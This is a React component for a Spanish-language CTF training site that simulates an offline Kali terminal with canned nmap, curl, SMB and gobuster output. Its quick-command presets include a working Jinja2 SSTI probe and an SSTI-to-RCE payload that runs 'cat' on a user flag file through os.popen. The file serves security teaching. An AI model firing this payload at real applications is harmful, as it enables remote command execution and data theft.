import React, { useState, useEffect, useRef } from 'react';
import {
  Terminal as TerminalIcon,
  Play,
  RotateCcw,
  Copy,
  Check,
  Download,
  Info,
  ExternalLink,
  Sparkles,
  Zap,
  Globe,
  Radio,
  FileCode,
} from 'lucide-react';
import { CTFScenario } from '../types';

interface TerminalPlaygroundViewProps {
  scenario: CTFScenario;
}

interface LogEntry {
  id: string;
  type: 'command' | 'output' | 'error' | 'success' | 'system';
  content: string;
}

export const TerminalPlaygroundView: React.FC<TerminalPlaygroundViewProps> = ({ scenario }) => {
  const [inputVal, setInputVal] = useState('');
  const [history, setHistory] = useState<string[]>([]);
  const [historyIdx, setHistoryIdx] = useState<number>(-1);
  const [copiedSession, setCopiedSession] = useState(false);

  const terminalEndRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);

  const initialBanner: LogEntry = {
    id: 'banner',
    type: 'system',
    content: `╔══════════════════════════════════════════════════════════════════════════════════════════════╗
║  NetPhantom CTF · Terminal de Reconocimiento y Pruebas Web Shell (Kali Linux 2026.1)          ║
║  Objetivo: ${scenario.themeName.padEnd(54)}║
║  IP Objetivo: ${scenario.ip.padEnd(16)} Codename: ${scenario.codename.padEnd(25)} OS: ${scenario.targetOS.padEnd(21)}║
║  Escribe 'help' para ver las herramientas disponibles o usa los accesos rápidos inferiores. ║
╚══════════════════════════════════════════════════════════════════════════════════════════════╝`,
  };

  const [logs, setLogs] = useState<LogEntry[]>([initialBanner]);

  // Auto-scroll to bottom of terminal
  useEffect(() => {
    terminalEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  // Focus input on click anywhere inside terminal
  const handleTerminalClick = () => {
    inputRef.current?.focus();
  };

  const executeCommand = (cmdText: string) => {
    const trimmed = cmdText.trim();
    if (!trimmed) return;

    // Add command to history
    setHistory((prev) => [...prev, trimmed]);
    setHistoryIdx(-1);

    const cmdEntry: LogEntry = {
      id: Math.random().toString(),
      type: 'command',
      content: `kali@netphantom:~$ ${trimmed}`,
    };

    const parts = trimmed.split(/\s+/);
    const mainCmd = parts[0].toLowerCase();
    const targetIp = scenario.ip;

    let responseEntry: LogEntry;

    if (mainCmd === 'clear' || mainCmd === 'cls') {
      setLogs([initialBanner]);
      setInputVal('');
      return;
    }

    if (mainCmd === 'help') {
      responseEntry = {
        id: Math.random().toString(),
        type: 'output',
        content: `Herramientas de Auditoría Soportadas en la Terminal Simulada:
  • nmap [-sC -sV -p- <ip>]          - Escaneo de puertos y detección de versiones
  • curl [-i <url>]                 - Peticiones HTTP y validación de vectores (SSTI, RCE, etc.)
  • smbclient [-N -L //<ip>]         - Enumeración de carpetas compartidas Samba
  • ping [-c <n> <ip>]              - Comprobación de latencia de red ICMP
  • gobuster [dir -u <url>]         - Descubrimiento de rutas web y directorios
  • ssh [<usuario>@<ip>]            - Simulación de conexión por terminal remota
  • whoami / id / uname -a          - Información del atacante en Kali Linux
  • scenario                        - Ficha técnica completa del laboratorio
  • clear                           - Limpiar la pantalla de la terminal

Ejemplos rápidos:
  $ nmap -sC -sV ${targetIp}
  $ curl -i "http://${targetIp}/?account={{7*7}}"
  $ smbclient -N -L //${targetIp}`,
      };
    } else if (mainCmd === 'scenario') {
      responseEntry = {
        id: Math.random().toString(),
        type: 'output',
        content: `[*] Laboratorio Activo: ${scenario.themeName}
  - Codename:          ${scenario.codename}
  - IP Target:         ${scenario.ip}
  - Dificultad:        ${scenario.difficulty}
  - Sistema Operativo: ${scenario.targetOS}
  - Vector Foothold:   ${scenario.vector}
  - Escalada PrivEsc:  ${scenario.secondaryVector}
  - Puertos Expuestos: ${scenario.openPorts.map((p) => `${p.port}/${p.service}`).join(', ')}`,
      };
    } else if (mainCmd === 'whoami') {
      responseEntry = {
        id: Math.random().toString(),
        type: 'output',
        content: 'kali',
      };
    } else if (mainCmd === 'id') {
      responseEntry = {
        id: Math.random().toString(),
        type: 'output',
        content: 'uid=1000(kali) gid=1000(kali) groups=1000(kali),27(sudo),100(users),109(netdev)',
      };
    } else if (mainCmd === 'uname' || mainCmd === 'uname -a') {
      responseEntry = {
        id: Math.random().toString(),
        type: 'output',
        content: 'Linux netphantom-kali 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.15-1kali1 x86_64 GNU/Linux',
      };
    } else if (mainCmd === 'ping') {
      const isTarget = trimmed.includes(targetIp) || trimmed.includes('target');
      if (isTarget) {
        responseEntry = {
          id: Math.random().toString(),
          type: 'output',
          content: `PING ${targetIp} (${targetIp}) 56(84) bytes of data.
64 bytes from ${targetIp}: icmp_seq=1 ttl=64 time=0.412 ms
64 bytes from ${targetIp}: icmp_seq=2 ttl=64 time=0.384 ms
64 bytes from ${targetIp}: icmp_seq=3 ttl=64 time=0.395 ms
64 bytes from ${targetIp}: icmp_seq=4 ttl=64 time=0.401 ms

--- ${targetIp} ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 0.384/0.398/0.412/0.011 ms`,
        };
      } else {
        responseEntry = {
          id: Math.random().toString(),
          type: 'error',
          content: `ping: connect: Network is unreachable (Prueba con la IP del objetivo: ${targetIp})`,
        };
      }
    } else if (mainCmd === 'nmap') {
      const portLines = scenario.openPorts
        .map((p) => {
          const portStr = `${p.port}/tcp`.padEnd(9);
          const stateStr = 'open'.padEnd(7);
          const srvStr = p.service.toLowerCase().padEnd(12);
          return `${portStr}${stateStr}${srvStr}${p.version} (${p.purpose})`;
        })
        .join('\n');

      const isHttp80 = scenario.openPorts.some((p) => p.port === 80 || p.port === 8080);
      const isSmb445 = scenario.openPorts.some((p) => p.port === 445);

      let extraScripts = '';
      if (isHttp80) {
        extraScripts += `|_http-title: ${scenario.themeName}\n|_http-server-header: Werkzeug / Gunicorn\n`;
      }
      if (isSmb445) {
        extraScripts += `| smb-os-discovery:\n|   OS: Linux (${scenario.targetOS})\n|_  Computer name: ${scenario.codename.toLowerCase()}\n`;
      }

      responseEntry = {
        id: Math.random().toString(),
        type: 'output',
        content: `Starting Nmap 7.94SVN ( https://nmap.org ) at ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
Nmap scan report for ${targetIp}
Host is up (0.00045s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE  SERVICE     VERSION
${portLines}
${extraScripts}
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.82 seconds`,
      };
    } else if (mainCmd === 'curl') {
      const lowerTrimmed = trimmed.toLowerCase();

      // Check for math evaluation SSTI like {{7*7}}
      if (lowerTrimmed.includes('{{7*7}}') || lowerTrimmed.includes('{{ 7 * 7 }}')) {
        responseEntry = {
          id: Math.random().toString(),
          type: 'success',
          content: `HTTP/1.1 200 OK
Server: Gunicorn/21.2.0 (Flask Engine)
Date: ${new Date().toUTCString()}
Content-Type: text/html; charset=utf-8
Content-Length: 284
Connection: keep-alive

<!DOCTYPE html>
<html>
<head><title>${scenario.themeName}</title></head>
<body style="background:#0a0e17; color:#00ffcc; font-family: monospace; padding: 20px;">
  <h2>${scenario.codename} - Interfaz de Consulta Web</h2>
  <div style="border: 1px solid #00ffcc; padding: 15px; margin-top: 10px;">
    Estado de validación: <strong>49</strong>
  </div>
  <p>[!] Expresión aritmética interpretada por el motor de plantillas (Jinja2 SSTI Confirmado).</p>
</body>
</html>`,
        };
      } else if (lowerTrimmed.includes('popen') || lowerTrimmed.includes('user.txt') || lowerTrimmed.includes('flag')) {
        // Payload for extracting flag
        responseEntry = {
          id: Math.random().toString(),
          type: 'success',
          content: `HTTP/1.1 200 OK
Server: Gunicorn/21.2.0
Date: ${new Date().toUTCString()}
Content-Type: text/html; charset=utf-8
Content-Length: 320

<!DOCTYPE html>
<html>
<body>
  <div class="result">
    Ejecución remota de comando exitosa (RCE):
    <pre style="color: #38bdf8; font-weight: bold; background: #000; padding: 10px;">${scenario.userFlag}</pre>
  </div>
</body>
</html>`,
        };
      } else if (trimmed.includes('404') || trimmed.includes('/no_existe')) {
        responseEntry = {
          id: Math.random().toString(),
          type: 'error',
          content: `HTTP/1.1 404 Not Found
Server: Gunicorn/21.2.0
Content-Type: text/html
Content-Length: 162

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server.</p>`,
        };
      } else {
        // Standard HTTP root request
        responseEntry = {
          id: Math.random().toString(),
          type: 'output',
          content: `HTTP/1.1 200 OK
Server: Gunicorn/21.2.0 (Python 3.11.2)
Date: ${new Date().toUTCString()}
Content-Type: text/html; charset=utf-8
Content-Length: 420
X-Powered-By: NetPhantom CTF Engine

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <title>${scenario.themeName}</title>
</head>
<body style="background: #0f172a; color: #f8fafc; font-family: sans-serif; text-align: center; padding-top: 50px;">
  <h1>Portal Corporativo: ${scenario.codename}</h1>
  <p>Acceso restringido para el personal autorizado. Todas las conexiones son auditadas.</p>
  <form action="/" method="GET">
    <label>Consultar Identificador de Cuenta:</label><br>
    <input type="text" name="account" placeholder="E-Coin ID o Alias" style="padding: 8px; margin: 10px;" />
    <button type="submit" style="padding: 8px 16px;">Verificar</button>
  </form>
</body>
</html>`,
        };
      }
    } else if (mainCmd === 'smbclient') {
      const isSmbPort = scenario.openPorts.some((p) => p.port === 445 || p.port === 139);
      if (!isSmbPort) {
        responseEntry = {
          id: Math.random().toString(),
          type: 'error',
          content: `Connection to ${targetIp} failed (Error NT_STATUS_CONNECTION_REFUSED)`,
        };
      } else {
        responseEntry = {
          id: Math.random().toString(),
          type: 'output',
          content: `Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        backup_decon    Disk      Archivos de Respaldo y Telemetría Médica (Acceso Anónimo)
        IPC$            IPC       IPC Service (${scenario.codename.toLowerCase()} server)
SMB1 disabled -- no workgroup available`,
        };
      }
    } else if (mainCmd === 'gobuster' || mainCmd === 'dirsearch' || mainCmd === 'ffuf') {
      responseEntry = {
        id: Math.random().toString(),
        type: 'output',
        content: `===============================================================
Gobuster v3.6 - Directory & File Enumeration Mode
===============================================================
[+] Target URL:          http://${targetIp}/
[+] Method:              GET
[+] Wordlist:            /usr/share/wordlists/dirb/common.txt
[+] Negative Status:     404
===============================================================
Starting gobuster...
===============================================================
/ (Status: 200) [Size: 420]
/static (Status: 301) [Size: 180] --> http://${targetIp}/static/
/login (Status: 200) [Size: 612]
/admin (Status: 403) [Size: 220]
/robots.txt (Status: 200) [Size: 48]
===============================================================
Finished in 1.41s`,
      };
    } else if (mainCmd === 'ssh') {
      const isSshPort = scenario.openPorts.some((p) => p.port === 22);
      if (!isSshPort) {
        responseEntry = {
          id: Math.random().toString(),
          type: 'error',
          content: `ssh: connect to host ${targetIp} port 22: Connection refused`,
        };
      } else {
        responseEntry = {
          id: Math.random().toString(),
          type: 'output',
          content: `The authenticity of host '${targetIp} (${targetIp})' can't be established.
ED25519 key fingerprint is SHA256:8sK2xL+9NmQ7PzW1vRy4JmX0T5uBcVaF9G1eH3kLoP8.
This host key is known by the following other names/addresses:
    (no other names)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '${targetIp}' (ED25519) to the list of known hosts.
elliot@${targetIp}'s password: 
Permission denied, please try again (Usa SSH una vez extraigas credenciales o la clave privada en el Foothold).`,
        };
      }
    } else {
      responseEntry = {
        id: Math.random().toString(),
        type: 'error',
        content: `bash: ${mainCmd}: orden no encontrada. Escribe 'help' para ver los comandos soportados en este simulador.`,
      };
    }

    setLogs((prev) => [...prev, cmdEntry, responseEntry]);
    setInputVal('');
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') {
      executeCommand(inputVal);
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (history.length > 0) {
        const nextIdx = historyIdx === -1 ? history.length - 1 : Math.max(0, historyIdx - 1);
        setHistoryIdx(nextIdx);
        setInputVal(history[nextIdx]);
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIdx !== -1) {
        const nextIdx = historyIdx + 1;
        if (nextIdx >= history.length) {
          setHistoryIdx(-1);
          setInputVal('');
        } else {
          setHistoryIdx(nextIdx);
          setInputVal(history[nextIdx]);
        }
      }
    } else if (e.key === 'Tab') {
      e.preventDefault();
      // Auto-complete basic commands
      const common = ['nmap', 'curl', 'smbclient', 'ping', 'gobuster', 'help', 'scenario', 'clear'];
      const match = common.find((c) => c.startsWith(inputVal.trim()));
      if (match) {
        setInputVal(match + ' ');
      }
    }
  };

  const handleCopyLogs = async () => {
    const text = logs.map((l) => l.content).join('\n');
    try {
      await navigator.clipboard.writeText(text);
      setCopiedSession(true);
      setTimeout(() => setCopiedSession(false), 2000);
    } catch (err) {
      console.error('Failed to copy session log:', err);
    }
  };

  const handleDownloadLog = () => {
    const text = logs.map((l) => l.content).join('\n');
    const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `terminal_${scenario.codename.toLowerCase()}_session.log`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const quickPresets = [
    {
      label: '🔍 Escaneo Nmap Completo',
      cmd: `nmap -sC -sV -p- ${scenario.ip}`,
      desc: 'Mapea puertos y versiones',
    },
    {
      label: '🌐 Inspección HTTP (curl -i)',
      cmd: `curl -i http://${scenario.ip}/`,
      desc: 'Cabeceras y cuerpo web',
    },
    {
      label: '⚡ Prueba SSTI {{7*7}}',
      cmd: `curl -i "http://${scenario.ip}/?account={{7*7}}"`,
      desc: 'Detección de inyección de plantillas',
    },
    {
      label: '🚩 Extracción Bandera User',
      cmd: `curl -i "http://${scenario.ip}/?account={{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /home/elliot/user.txt').read()}}"`,
      desc: 'Ejecución de comando y lectura de flag',
    },
    {
      label: '📂 Enumeración SMB',
      cmd: `smbclient -N -L //${scenario.ip}`,
      desc: 'Listado de carpetas compartidas',
    },
    {
      label: '📡 Ping de Latencia',
      cmd: `ping -c 4 ${scenario.ip}`,
      desc: 'Comprobación de conectividad',
    },
  ];

  return (
    <div className="space-y-4 animate-in fade-in duration-150">
      {/* Header Bar */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 p-4 rounded-xl bg-slate-900/70 border border-slate-800">
        <div>
          <div className="flex items-center gap-2 text-xs font-mono text-cyan-400">
            <TerminalIcon className="w-4 h-4 text-cyan-400" />
            <span>TERMINAL WEB SHELL PLAYGROUND</span>
            <span aria-hidden="true">·</span>
            <span className="text-emerald-400 font-semibold flex items-center gap-1">
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
              CONECTADO A {scenario.ip}
            </span>
          </div>
          <h2 className="text-lg font-bold text-white mt-1">
            Simulador de Terminal de Ataque y Reconocimiento
          </h2>
          <p className="text-xs text-slate-400">
            Experimenta y practica tus comandos ofensivos antes de encender el entorno de Docker local.
          </p>
        </div>

        <div className="flex items-center gap-2 flex-wrap">
          <button
            type="button"
            onClick={handleCopyLogs}
            className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium text-slate-300 bg-slate-800 hover:bg-slate-700 rounded-lg border border-slate-700/80 transition-colors cursor-pointer"
            title="Copiar salida de la sesión de terminal"
          >
            {copiedSession ? (
              <>
                <Check className="w-3.5 h-3.5 text-emerald-400" />
                <span className="text-emerald-400">Copiado</span>
              </>
            ) : (
              <>
                <Copy className="w-3.5 h-3.5 text-cyan-400" />
                <span>Copiar Sesión</span>
              </>
            )}
          </button>

          <button
            type="button"
            onClick={handleDownloadLog}
            className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium text-slate-300 bg-slate-800 hover:bg-slate-700 rounded-lg border border-slate-700/80 transition-colors cursor-pointer"
            title="Descargar registro .log"
          >
            <Download className="w-3.5 h-3.5 text-slate-400" />
            <span>Descargar .log</span>
          </button>

          <button
            type="button"
            onClick={() => setLogs([initialBanner])}
            className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium text-rose-300 bg-rose-950/40 hover:bg-rose-900/60 rounded-lg border border-rose-900/60 transition-colors cursor-pointer"
            title="Limpiar pantalla"
          >
            <RotateCcw className="w-3.5 h-3.5 text-rose-400" />
            <span>Limpiar</span>
          </button>
        </div>
      </div>

      {/* Quick Preset Buttons */}
      <div className="flex items-center gap-2 overflow-x-auto pb-1 text-xs">
        <span className="text-slate-400 font-mono text-[11px] whitespace-nowrap shrink-0 flex items-center gap-1">
          <Zap className="w-3 h-3 text-amber-400" />
          Comandos Rápidos:
        </span>
        {quickPresets.map((preset, idx) => (
          <button
            key={idx}
            type="button"
            onClick={() => executeCommand(preset.cmd)}
            className="px-2.5 py-1 rounded-md bg-slate-900 hover:bg-slate-800 border border-slate-800 hover:border-cyan-600/80 text-slate-300 hover:text-cyan-300 font-mono text-[11px] whitespace-nowrap transition-colors cursor-pointer shrink-0 shadow-sm"
            title={preset.desc}
          >
            {preset.label}
          </button>
        ))}
      </div>

      {/* Terminal Screen Window */}
      <div
        onClick={handleTerminalClick}
        className="rounded-2xl border border-slate-800 bg-[#090d16] shadow-2xl overflow-hidden cursor-text flex flex-col min-h-[500px] max-h-[640px]"
      >
        {/* Terminal Title Bar */}
        <div className="flex items-center justify-between px-4 py-2.5 bg-[#0e1424] border-b border-slate-800/90 select-none">
          <div className="flex items-center gap-2">
            <div className="flex items-center gap-1.5">
              <span className="w-3 h-3 rounded-full bg-rose-500 inline-block shadow-sm shadow-rose-900/50" />
              <span className="w-3 h-3 rounded-full bg-amber-500 inline-block shadow-sm shadow-amber-900/50" />
              <span className="w-3 h-3 rounded-full bg-emerald-500 inline-block shadow-sm shadow-emerald-900/50" />
            </div>
            <span className="font-mono text-xs font-semibold text-slate-300 ml-2">
              kali@netphantom:~
            </span>
          </div>

          <div className="flex items-center gap-3 text-[11px] font-mono text-slate-400">
            <span className="px-2 py-0.5 rounded bg-cyan-950/80 text-cyan-300 border border-cyan-800/60 font-semibold">
              TARGET: {scenario.ip}
            </span>
            <span className="text-slate-500 hidden sm:inline">bash (x86_64)</span>
          </div>
        </div>

        {/* Terminal Body Scroll Area */}
        <div className="flex-1 p-4 sm:p-5 overflow-y-auto font-mono text-xs sm:text-[13px] leading-relaxed space-y-2 selection:bg-cyan-500 selection:text-slate-950">
          {logs.map((log) => {
            if (log.type === 'system') {
              return (
                <div key={log.id} className="text-cyan-400 whitespace-pre font-bold leading-tight pb-2">
                  {log.content}
                </div>
              );
            }
            if (log.type === 'command') {
              return (
                <div key={log.id} className="flex items-center gap-1 text-slate-100 font-bold pt-2">
                  <span className="text-emerald-400">kali@netphantom</span>
                  <span className="text-slate-400">:</span>
                  <span className="text-cyan-300">~</span>
                  <span className="text-slate-400">$</span>
                  <span className="text-slate-100 ml-1">{log.content.replace('kali@netphantom:~$ ', '')}</span>
                </div>
              );
            }
            if (log.type === 'error') {
              return (
                <pre key={log.id} className="text-rose-400 whitespace-pre-wrap pl-2 border-l-2 border-rose-600/60 py-0.5">
                  {log.content}
                </pre>
              );
            }
            if (log.type === 'success') {
              return (
                <pre key={log.id} className="text-emerald-300 whitespace-pre-wrap pl-2 border-l-2 border-emerald-500/60 py-0.5">
                  {log.content}
                </pre>
              );
            }
            return (
              <pre key={log.id} className="text-slate-300 whitespace-pre-wrap">
                {log.content}
              </pre>
            );
          })}

          {/* Active Command Line Input */}
          <div className="flex items-center gap-2 pt-1">
            <span className="text-emerald-400 font-bold whitespace-nowrap">kali@netphantom</span>
            <span className="text-slate-400">:</span>
            <span className="text-cyan-300 font-bold">~</span>
            <span className="text-slate-400 font-bold">$</span>
            <input
              ref={inputRef}
              type="text"
              value={inputVal}
              onChange={(e) => setInputVal(e.target.value)}
              onKeyDown={handleKeyDown}
              autoFocus
              spellCheck={false}
              autoComplete="off"
              className="flex-1 bg-transparent border-none outline-none text-slate-100 font-mono text-xs sm:text-[13px] caret-cyan-400 focus:ring-0 p-0"
              placeholder="Escribe un comando (ej: nmap, curl, help)..."
            />
          </div>

          <div ref={terminalEndRef} />
        </div>

        {/* Terminal Footer Tips */}
        <div className="px-4 py-2 bg-[#0c111e] border-t border-slate-800/80 flex items-center justify-between text-[11px] font-mono text-slate-400 flex-wrap gap-2">
          <div className="flex items-center gap-3">
            <span>[Enter] Ejecutar</span>
            <span>[↑ / ↓] Historial</span>
            <span>[Tab] Autocompletar</span>
            <span>'clear' Limpiar</span>
          </div>

          <div className="text-cyan-400 flex items-center gap-1 font-semibold">
            <Info className="w-3.5 h-3.5" />
            <span>Simulador de Entorno Aislado Offline</span>
          </div>
        </div>
      </div>
    </div>
  );
};
